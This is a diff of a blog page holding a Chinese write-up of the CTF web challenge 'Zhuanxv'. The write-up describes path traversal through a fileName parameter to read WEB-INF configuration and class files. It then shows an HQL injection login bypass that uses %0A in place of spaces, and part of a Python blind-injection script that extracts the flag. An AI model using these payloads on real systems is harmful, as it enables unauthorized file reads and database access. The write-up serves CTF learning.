@@ -7,10 +7,10 @@
     <meta name="keywords" content="XCTF 4th-SCTF-2018-Web-Zhuanxv, 学习记录">
     <meta name="description" content="攻防世界题目记录
 
-
  题目描述：你只是在扫描目标端口的时候发现了一个开放的web服务 
-1.使用dirsearch进行目录扫描，得到&amp;#x2F;list后台登陆界面，尝试登陆&amp;#x2F;sql注入无果
-2.抓包尝试访问一下 &amp;#x2F; ">
+1.使用dirsearch进行目录扫描，得到/list后台登陆界面，尝试登陆/sql注入无果
+2.抓包尝试访问一下 / 以及/list ,在/ 下发现
+">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -506,20 +506,19 @@
             <div id="articleContent">
                 <p>攻防世界题目记录</p>
 <span id="more"></span>
-
 <p> 题目描述：你只是在扫描目标端口的时候发现了一个开放的web服务 </p>
-<p>1.使用dirsearch进行目录扫描，得到&#x2F;list后台登陆界面，尝试登陆&#x2F;sql注入无果</p>
-<p>2.抓包尝试访问一下 &#x2F; 以及&#x2F;list ,在&#x2F; 下发现<img src="/images/1649936878497.png" alt="1649936878497"></p>
+<p>1.使用dirsearch进行目录扫描，得到/list后台登陆界面，尝试登陆/sql注入无果</p>
+<p>2.抓包尝试访问一下 / 以及/list ,在/ 下发现<img src="/images/1649936878497.png" alt="1649936878497"></p>
 <p>出现jsessionid，说明是java开发的网页。</p>
-<p>3.burp抓包发现当访问&#x2F;list目录时，会先加载一个图片文件。</p>
+<p>3.burp抓包发现当访问/list目录时，会先加载一个图片文件。</p>
 <p><img src="/images/1649936821330.png" alt="1649936821330"></p>
 <p>访问之后是下载得到一个图片。</p>
-<p>4.尝试对fileName参数进行任意文件读取，输入..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd无果。根据以上发现的此网页是基于java开发的，尝试访问..&#x2F;..&#x2F;WEB-INF&#x2F;web.xml，成功下载到此文件。</p>
+<p>4.尝试对fileName参数进行任意文件读取，输入../../../../etc/passwd无果。根据以上发现的此网页是基于java开发的，尝试访问../../WEB-INF/web.xml，成功下载到此文件。</p>
 <p>内容：<img src="/images/1649937312485.png" alt="1649937312485"></p>
 <p>打开配置文件，发现Struts2，<strong>Struts2在WEB-INF目录的class目录下有个核心的xml文件</strong> 叫struts.xml</p>
-<p>5.访问fileName&#x3D;..&#x2F;..&#x2F;WEB-INF&#x2F;classes&#x2F;struts.xml,成功下载</p>
+<p>5.访问fileName=../../WEB-INF/classes/struts.xml,成功下载</p>
 <p>内容：<img src="/images/1649937416411.png" alt="1649937416411"></p>
-<p>好，发现几个拦截器类的路径， 访问..&#x2F;..&#x2F;WEB-INF&#x2F;classes&#x2F;applicationContext.xml，获取class文件路径和项目配置信息、数据库信息 </p>
+<p>好，发现几个拦截器类的路径， 访问../../WEB-INF/classes/applicationContext.xml，获取class文件路径和项目配置信息、数据库信息 </p>
 <p>内容如下</p>
 <pre class="line-numbers language-java" data-language="java"><code class="language-java">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;
 &lt;beans xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans&quot;
@@ -581,24 +580,20 @@
         &lt;&#x2F;property&gt;
     &lt;&#x2F;bean&gt;
 &lt;&#x2F;beans&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>这里暴露了数据库的端口用户名密码，尝试远程连接数据库，失败。</p>
 <p>我们发现这里还有一个user.hbm.xml以及很多class类名，那我们继续下载查看</p>
 <pre class="line-numbers language-java" data-language="java"><code class="language-java">loadimage?fileName&#x3D;..&#x2F;..&#x2F;WEB-INF&#x2F;classes&#x2F;user.hbm.xml
 loadimage?fileName&#x3D;..&#x2F;..&#x2F;WEB-INF&#x2F;classes&#x2F;com&#x2F;cuitctf&#x2F;service&#x2F;impl&#x2F;UserServiceImpl.class
 loadimage?fileName&#x3D;..&#x2F;..&#x2F;WEB-INF&#x2F;classes&#x2F;com&#x2F;cuitctf&#x2F;dao&#x2F;impl&#x2F;UserDaoImpl.class<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-
 <p> 从UserServiceImpl.class里，我们可以看到，系统对用户名进行了过滤，过滤了空格和等号。 </p>
 <p><img src="/images/1650295153430.png" alt="1650295153430"></p>
 <p> 从UserDaoImpl.class里，我们可以看到查询语句，这里使用的sql语句与mysql不太一样，使用的是HSQL。 </p>
 <p>可以尝试构造万能密码</p>
 <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">from User where name &#x3D;&#39;admin&#39; or &#39;1&#39;&gt;&#39;0&#39; or name like &#39;admin&#39; and password &#x3D; &#39;&quot; + password + &quot;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
 <p> 黄色部分就是拼接的语句，由于这里过滤了空格，可以考虑用换行符%0A替代空格绕过过滤 </p>
 <p>payload：</p>
 <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">用户名：admin&#39;%0Aor%0A&#39;1&#39;&gt;&#39;0&#39;%0Aor%0Aname%0Alike%0A&#39;admin
 密码：123（随意）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
 <p>登录成功，然而并没有找到flag。</p>
 <p> 再看一下之前下载的user.hbm.xml文件内容，发现了flag的映射类。 </p>
 <pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0"?></span>
@@ -620,7 +615,6 @@ loadimage?fileName&#x3D;..&#x2F;..&#x2F;WEB-INF&#x2F;classes&#x2F;com&#x2F;cuitc
         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>flag<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>class</span><span class="token punctuation">></span></span>
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>hibernate-mapping</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>至此，我们知道，flag在数据库中。</p>
 <p>由于万能密钥成功登录的原因是’1’&gt;’0’恒成立，我们可以在此处写payload构造盲注语句，爆破flag。</p>
 <p>官方wp如下</p>
@@ -642,10 +636,8 @@ for i in range(1,50):
             print i,flag
             break
         p&#x3D;chr(j)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>我对payload的理解：将payload带入后查询语句为</p>
 <pre class="line-numbers language-none"><code class="language-none">from User where name &#x3D; &#39; admin&#39;%0aor%0a(select%0Aascii(substr(id,&quot;+str(i)+&quot;,1))%0Afrom%0AFlag%0Awhere%0Aid&lt;2)&lt;&#39;num&#39;%0Aor%0Aname%0Alike%0A&#39;admin&#39; and password &#x3D; &#39;1&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
 <p>这样不太清晰，urldecode一下</p>
 <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">from User where name &#x3D; &#39; admin&#39;
 or
@@ -673,7 +665,6 @@ or
 like
 &#39;admin&#39; and password &#x3D; &#39;1&#39;)
 #所以后面的name like 随便写一个符合语法的就行&#x3D; &#x3D;，至于where id &lt; 2，应该是想要选择特定的列数把<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 
                 
             </div>
@@ -1058,7 +1049,7 @@ like
             contentSelector: '#articleContent',
             headingsOffset: -($(window).height() * 0.4 - 45),
             collapseDepth: Number('0'),
-            headingSelector: 'h2, h3, h4'
+            headingSelector: 'h2, h3, h4,h5'
         });
 
         // modify the toc link href to support Chinese.
@@ -1070,7 +1061,7 @@ like
 
         // modify the heading title id to support Chinese.
         i = 0;
-        $('#articleContent').children('h2, h3, h4').each(function () {
+        $('#articleContent').children('h2, h3, h4,h5').each(function () {
             $(this).attr('id', tocHeading + (++i));
         });
 
@@ -1199,7 +1190,7 @@ like
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">267.7k</span>
+                        class="white-color">259.5k</span>
             
             
             
